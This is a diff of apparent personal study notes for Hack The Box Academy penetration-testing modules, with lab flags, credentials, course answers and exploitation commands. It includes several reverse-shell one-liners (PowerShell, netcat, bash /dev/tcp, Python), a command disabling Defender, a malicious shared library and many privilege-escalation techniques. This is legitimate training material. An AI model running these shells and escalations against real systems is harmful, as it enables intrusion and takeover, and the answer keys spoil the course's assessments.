@@ -1,4 +1,3 @@
-
 ```bash
 # What's the contents of table flag2? (Case #2)
 sqlmap  --batch --dump -T flag2 --forms --crawl=2
@@ -29,7 +28,7 @@ sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
 
 ```bash
 # What's the contents of table flag8? (Case #8)
-sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent 
+sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent
 # HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
 
 # What's the contents of table flag9? (Case #9)
@@ -64,15 +63,12 @@ sqlmap -u "http://94.237.63.201:48886" --os-shell --crawl=2 --technique=E
 ```bash
 # What's the contents of the table final_flag?
 
-``` 
-
-
+```
 
 ```bash
 # values generation 1 to 1000
 for i in $(seq 1 1000); do echo $i >> ids.txt; done
 ```
-
 
 ```bash
 # id value fuzzing
@@ -84,9 +80,11 @@ ffuf -w ids.txt:FUZZ -u http:83.136.255.180:43420 -X POST -d 'id=FUZZ' -H 'Conte
 # 94.237.49.178:41421
 ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://admin.academy.htb:41421/admin/admin.php?FUZZ=key" -fs 798
 ```
+
 ## General
 
 ### Intro to Network Traffic Analysis
+
 <!-- RDP w/ htb-student and HTB_@cademy_stdnt! -->
 
 ```bash
@@ -108,10 +106,9 @@ ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 
 ### Intro to Assembly Language
 
-
-
 ### Documentation and Reporting
-```bash
+
+````bash
 xfreerdp /v:10.129.166.23 /u:htb-student /p:HTB_@cademy_stdnt!
 
 # Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.
@@ -157,10 +154,10 @@ gobuster vhost -u http://10.129.134.122 -w /opt/useful/SecLists/Discovery/DNS/na
 
 ## Enumerate the target and find a vHost that contains flag No. 3. Submit the flag value as your answer (in the format HTB{DATA}).
 
-## Enumerate the target and find a vHost that contains flag No. 4. Submit the flag value as your answer (in the format HTB{DATA}). 
+## Enumerate the target and find a vHost that contains flag No. 4. Submit the flag value as your answer (in the format HTB{DATA}).
 
 ## Find the specific vHost that starts with the letter "d" and submit the flag value as your answer (in the format HTB{DATA}).
-```
+````
 
 ```bash
 # SKILLS ASSESSMENT
@@ -243,7 +240,7 @@ curl -I 'https://i.imgur.com'
 
 # Try to use a different technique to gain RCE and read the flag at /
 
-# target - 
+# target -
 # Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
 
 # target -
@@ -254,7 +251,7 @@ curl -I 'https://i.imgur.com'
 # Place a PHP File in /var/www/html/ which contains a PHP Webshell using SYSTEM(), then use curl to execute the file. Be sure to restart apache after editing the PHP Configuration!
 
 # target -
-# Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 
+# Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
 7.2.1
 
 ```
@@ -281,7 +278,7 @@ PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: 10.129.27.76 - /
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 135/tcp open  msrpc        Microsoft Windows RPC
 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
@@ -289,20 +286,20 @@ PORT    STATE SERVICE      VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   311: 
+| smb2-security-mode:
+|   311:
 |_    Message signing enabled but not required
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
 |   Computer name: SHELLS-WINBLUE
 |   NetBIOS computer name: SHELLS-WINBLUE\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2024-06-16T14:48:13-07:00
-| smb2-time: 
+| smb2-time:
 |   date: 2024-06-16T21:48:12
 |_  start_date: 2024-06-16T20:49:02
 |_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: <blank>
 |   authentication_level: user
 |   challenge_response: supported
@@ -328,31 +325,37 @@ LHOST => 10.10.14.222
 ```
 
 #### Reverse Shell
+
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 #### Disable AV
+
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 #### Netcat/Bash Reverse Shell One-liner
+
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 ```
 
 #### Open a connection with netcat
+
 ```bash
-nc 10.10.14.12 7777 > /tmp/f  
+nc 10.10.14.12 7777 > /tmp/f
 ```
 
 #### NMAP Scan
+
 ```bash
 nmap -sC -sV -Pn 10.129.201.160
 ```
 
 #### Msfconsole Target Discovery and Exploit
+
 ```bash
 nmap -sC -sV -Pn 10.129.27.76 -oX nmap_scan.xml
 msfconsole
@@ -366,6 +369,7 @@ search type:exploit name:iis version:10.0
 ```
 
 scan_and_exploit.sh script
+
 ```bash
 #!/bin/bash
 
@@ -382,10 +386,10 @@ exit;"
 ```
 
 ### Command Injections
+
 ```bash
 # target - 94.237.63.201:33153
 ```
-
 
 ### Web Service & API Attacks
 
@@ -397,192 +401,193 @@ curl http://<TARGET IP>:3002/wsdl?wsdl
 ```
 
 ### Example WSDL Response
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<wsdl:definitions targetNamespace="http://tempuri.org/" 
-  xmlns:s="http://www.w3.org/2001/XMLSchema" 
-  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
-  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
-  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
-  xmlns:tns="http://tempuri.org/" 
-  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
-  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
-  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
+<wsdl:definitions targetNamespace="http://tempuri.org/"
+  xmlns:s="http://www.w3.org/2001/XMLSchema"
+  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
+  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
+  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
+  xmlns:tns="http://tempuri.org/"
+  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
+  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
   xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
-  
+
   <wsdl:types>
-    
-    
+
+
     <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
-      
-      
-      
+
+
+
       <s:element name="LoginRequest">
-        
+
         <s:complexType>
           <s:sequence>
             <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
             <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
           </s:sequence>
         </s:complexType>
-        
+
       </s:element>
-      
-      
+
+
       <s:element name="LoginResponse">
-        
+
         <s:complexType>
           <s:sequence>
             <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
           </s:sequence>
         </s:complexType>
       </s:element>
-      
-      
+
+
       <s:element name="ExecuteCommandRequest">
-        
+
         <s:complexType>
           <s:sequence>
             <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
           </s:sequence>
         </s:complexType>
-        
+
       </s:element>
-      
+
       <s:element name="ExecuteCommandResponse">
-        
+
         <s:complexType>
           <s:sequence>
             <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
           </s:sequence>
         </s:complexType>
-        
+
       </s:element>
-      
-      
-      
+
+
+
     </s:schema>
-    
-    
+
+
   </wsdl:types>
-  
-  
-  
-  
+
+
+
+
   <!-- Login Messages -->
   <wsdl:message name="LoginSoapIn">
-    
+
     <wsdl:part name="parameters" element="tns:LoginRequest"/>
-    
+
   </wsdl:message>
-  
-  
+
+
   <wsdl:message name="LoginSoapOut">
-    
+
     <wsdl:part name="parameters" element="tns:LoginResponse"/>
-    
+
   </wsdl:message>
-  
-  
+
+
   <!-- ExecuteCommand Messages -->
   <wsdl:message name="ExecuteCommandSoapIn">
-    
+
     <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
-    
+
   </wsdl:message>
-  
-  
+
+
   <wsdl:message name="ExecuteCommandSoapOut">
-    
+
     <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
-    
+
   </wsdl:message>
-  
-  
-  
-  
-  
+
+
+
+
+
   <wsdl:portType name="HacktheBoxSoapPort">
-    
-    
+
+
     <!-- Login Operaion | PORT -->
     <wsdl:operation name="Login">
-      
+
       <wsdl:input message="tns:LoginSoapIn"/>
       <wsdl:output message="tns:LoginSoapOut"/>
-      
+
     </wsdl:operation>
-    
-    
+
+
     <!-- ExecuteCommand Operation | PORT -->
     <wsdl:operation name="ExecuteCommand">
-      
+
       <wsdl:input message="tns:ExecuteCommandSoapIn"/>
       <wsdl:output message="tns:ExecuteCommandSoapOut"/>
-      
+
     </wsdl:operation>
-    
+
   </wsdl:portType>
-  
-  
-  
-  
-  
+
+
+
+
+
   <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
-    
-    
+
+
     <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
-    
+
     <!-- SOAP Login Action -->
     <wsdl:operation name="Login">
-      
+
       <soap:operation soapAction="Login" style="document"/>
-      
+
       <wsdl:input>
         <soap:body use="literal"/>
       </wsdl:input>
-      
+
       <wsdl:output>
         <soap:body use="literal"/>
       </wsdl:output>
-      
+
     </wsdl:operation>
-    
-    
+
+
     <!-- SOAP ExecuteCommand Action -->
     <wsdl:operation name="ExecuteCommand">
       <soap:operation soapAction="ExecuteCommand" style="document"/>
-      
+
       <wsdl:input>
         <soap:body use="literal"/>
       </wsdl:input>
-      
+
       <wsdl:output>
         <soap:body use="literal"/>
       </wsdl:output>
     </wsdl:operation>
-    
-    
+
+
   </wsdl:binding>
-  
-  
-  
-  
-  
+
+
+
+
+
   <wsdl:service name="HacktheboxService">
-    
-    
+
+
     <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
       <soap:address location="http://localhost:80/wsdl"/>
     </wsdl:port>
-    
-    
+
+
   </wsdl:service>
-  
-  
-  
-  
-  
+
+
+
+
+
 </wsdl:definitions>
 ```
 
@@ -623,6 +628,7 @@ python3 automate.py
 ```
 
 #### Command Injection
+
 http://<TARGET IP>:3003/ping-server.php/ping
 
 ```bash
@@ -714,9 +720,8 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ### Intro to Assembly Language
 
-Download the attached file, and find the hex value in 'rax' when we reach the instruction at <_start+16>?
+Download the attached file, and find the hex value in 'rax' when we reach the instruction at <\_start+16>?
 Break and step
-
 
 ```bash
 # Note: The -f elf64 flag is used to note that we want to assemble a 64-bit assembly code. If we wanted to assemble a 32-bit code, we would use -f elf
@@ -796,7 +801,7 @@ ni
 help patch
 ```
 
-Download the attached file, and find the hex value in 'rax' when we reach the instruction at <_start+16>? 
+Download the attached file, and find the hex value in 'rax' when we reach the instruction at <\_start+16>?
 
 ```bash
 cd ~/Downloads
@@ -806,7 +811,8 @@ break *_start+16
 r
 # $rax = 0x21796d6564637708
 ```
-Add an instruction at the end of the attached code to move the value in "rsp" to "rax". What is the hex value of "rax" at the end of program execution? 
+
+Add an instruction at the end of the attached code to move the value in "rsp" to "rax". What is the hex value of "rax" at the end of program execution?
 Are we moving the value or the address?
 
 ```bash
@@ -818,7 +824,7 @@ r
 # $rax   : 0x400
 ```
 
-Add an instruction to the end of the attached code to "xor" "rbx" with "15". What is the hex value of 'rbx' at the end? 
+Add an instruction to the end of the attached code to "xor" "rbx" with "15". What is the hex value of 'rbx' at the end?
 
 ```bash
 unzip arithmetic.zip
@@ -854,17 +860,18 @@ r
 # $rbx   : 0x4
 ```
 
-The attached assembly code loops forever. Try to modify (mov rax, 5) to make it not loop. What hex value prevents the loop? 
+The attached assembly code loops forever. Try to modify (mov rax, 5) to make it not loop. What hex value prevents the loop?
 When will "jnz" not jump?
 
 ```bash
 unzip conditional.zip
-# change to mov rax, 2 
+# change to mov rax, 2
 bash assembler.sh conditional.s -g
 r
 # 0x2
 ```
-Debug the attached binary to find the flag being pushed to the stack 
+
+Debug the attached binary to find the flag being pushed to the stack
 It gradually builds up in "rsp"
 
 ```bash
@@ -873,7 +880,7 @@ bash assembler.sh stack.s -g
 watch $rsp and repeatedly continue
 ```
 
-Try assembling and debugging the above code, and note how "call" and "ret" store and retrieve "rip" on the stack. What is the address at the top of the stack after entering "Exit"? (6-digit hex 0xaddress, without zeroes) 
+Try assembling and debugging the above code, and note how "call" and "ret" store and retrieve "rip" on the stack. What is the address at the top of the stack after entering "Exit"? (6-digit hex 0xaddress, without zeroes)
 You can use "ni" to step to the next call, and "si" to step into the call.
 
 ```bash
@@ -958,9 +965,7 @@ python assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f2048545
 ./assembler
 ```
 
-
-
-Try to fix the Stack Alignment in "print", so it does not crash, and prints "Its Aligned!". How much boundary was needed to be added? "write a number" 
+Try to fix the Stack Alignment in "print", so it does not crash, and prints "Its Aligned!". How much boundary was needed to be added? "write a number"
 Count pushes/calls so far, each adds 8 bytes, total boundary needed is 16 bytes
 
 ```bash
@@ -968,7 +973,7 @@ nasm -f elf64 functions.s &&  ld functions.o -o functions -lc --dynamic-linker /
 # 8
 ```
 
-Run the "Exercise Shellcode" to get the flag. 
+Run the "Exercise Shellcode" to get the flag.
 
 ```bash
 python assembler.py 4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b84854427b6c303464504889e64831c0b0014831ff40b7014831d2b2190f054831c0043c4030ff0f05
@@ -977,9 +982,9 @@ python assembler.py 4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b8
 The above server simulates an exploitable server you can execute shellcodes on. Use one of the tools to generate a shellcode that prints the content of '/flag.txt', then connect to the sever with "nc SERVER_IP PORT" to send the shellcode.
 /bin/cat /flag.txt
 
-Disassemble 'loaded_shellcode' and modify its assembly code to decode the shellcode, by adding a loop to 'xor' each 8-bytes on the stack with the key in 'rbx'. 
+Disassemble 'loaded_shellcode' and modify its assembly code to decode the shellcode, by adding a loop to 'xor' each 8-bytes on the stack with the key in 'rbx'.
 
-The above server simulates a vulnerable server that we can run our shellcodes on. Optimize 'flag.s' for shellcoding and get it under 50 bytes, then send the shellcode to get the flag. (Feel free to find/create a custom shellcode) 
+The above server simulates a vulnerable server that we can run our shellcodes on. Optimize 'flag.s' for shellcoding and get it under 50 bytes, then send the shellcode to get the flag. (Feel free to find/create a custom shellcode)
 
 #### Linux Privelge Escalation
 
@@ -989,6 +994,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 # enumerate set-group-id (setgid) permission
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
 ```
+
 ```bash
 # special permissions - break out of restricted environment + spawn shell
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
@@ -1031,7 +1037,7 @@ Find a file with the setuid bit set that was not shown in the section command ou
 # -rwsr-xr-x 1 root root 113336 May 24  2021 /sbin/mount.nfs
 
 
-# Find a file with the setgid bit set that was not shown in the section command output (full path to the binary). 
+# Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).
 
 # -rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
 # * -rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter
@@ -1157,7 +1163,7 @@ screen -ls # screen itself is setuid, so...
 ```
 
 ```bash
-# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" 
+# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!"
 # Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.
 
 ```
@@ -1177,7 +1183,7 @@ SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
- 
+
 bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 ```
 
@@ -1186,8 +1192,8 @@ nc -lnvp 443
 ```
 
 ```bash
-# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" 
-# Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory. 
+# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!"
+# Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.
 ```
 
 #### Containers (LXD)
@@ -1203,7 +1209,7 @@ ls -l /mnt/root
 ```
 
 ```bash
-# Escalate the privileges and submit the contents of flag.txt as the answer. 
+# Escalate the privileges and submit the contents of flag.txt as the answer.
 ```
 
 #### Docker
@@ -1228,7 +1234,7 @@ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt 
 ```
 
 ```bash
-Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer. 
+Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.
 ```
 
 #### Logrotate
@@ -1325,7 +1331,7 @@ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 ```
 
 ```bash
-# Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory. 
+# Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.
 ```
 
 #### Shared Object Hijacking
@@ -1337,7 +1343,7 @@ readelf -d payroll  | grep PATH
 ls -la /development/
 ldd payroll
 cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
-./payroll 
+./payroll
 ```
 
 ```c
@@ -1348,16 +1354,16 @@ void dbquery() {
     printf("Malicious library loaded\n");
     setuid(0);
     system("/bin/sh -p");
-} 
+}
 ```
 
 ```bash
 gcc src.c -fPIC -shared -o /development/libshared.so
-./payroll 
+./payroll
 ```
 
 ```bash
-# Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section. 
+# Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section.
 ```
 
 #### Python Library Hijacking
@@ -1399,7 +1405,7 @@ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
 def virtual_memory():
 
 	...SNIP...
-	
+
     global _TOTAL_PHYMEM
     ret = _psplatform.virtual_memory()
     # cached for later use in Process.memory_percent()
@@ -1418,7 +1424,7 @@ def virtual_memory():
 	#### Hijacking
 	import os
 	os.system('id')
-	
+
 
     global _TOTAL_PHYMEM
     ret = _psplatform.virtual_memory()
@@ -1454,9 +1460,8 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 ```
 
 ```bash
-# Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer. 
+# Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.
 ```
-
 
 #### Sudo
 
@@ -1475,7 +1480,7 @@ sudo -u#-1 id
 ```
 
 ```bash
-# Escalate the privileges and submit the contents of flag.txt as the answer. 
+# Escalate the privileges and submit the contents of flag.txt as the answer.
 ```
 
 #### Polkit
@@ -1490,7 +1495,7 @@ gcc cve-2021-4034-poc.c -o poc
 ```
 
 ```bash
-# Escalate the privileges and submit the contents of flag.txt as the answer. 
+# Escalate the privileges and submit the contents of flag.txt as the answer.
 ```
 
 #### Dirty Pipe
@@ -1506,7 +1511,7 @@ find / -perm -4000 2>/dev/null
 ```
 
 ```bash
-# Escalate the privileges and submit the contents of flag.txt as the answer. 
+# Escalate the privileges and submit the contents of flag.txt as the answer.
 ```
 
 #### Linux Local Privelege Escalation - Skills Assessment
@@ -1578,7 +1583,7 @@ What kind of session identifier does the application employ? Answer options (wit
 #### Cross-Site Request Forgery (POST-based)
 
 ```bash
-# If csrf.htb.net was utilizing secure cookies, would an attacker still be able to leak Julie Roger's CSRF token? Answer format: Yes or No 
+# If csrf.htb.net was utilizing secure cookies, would an attacker still be able to leak Julie Roger's CSRF token? Answer format: Yes or No
 # Yes
 ```
 
@@ -1610,8 +1615,6 @@ What kind of session identifier does the application employ? Answer options (wit
 # Make the admin's profile public to see the flag
 # [YOU_ARE_A_SESSION_WARRIOR]
 
-# Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string} 
+# Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}
 
 ```
-
-
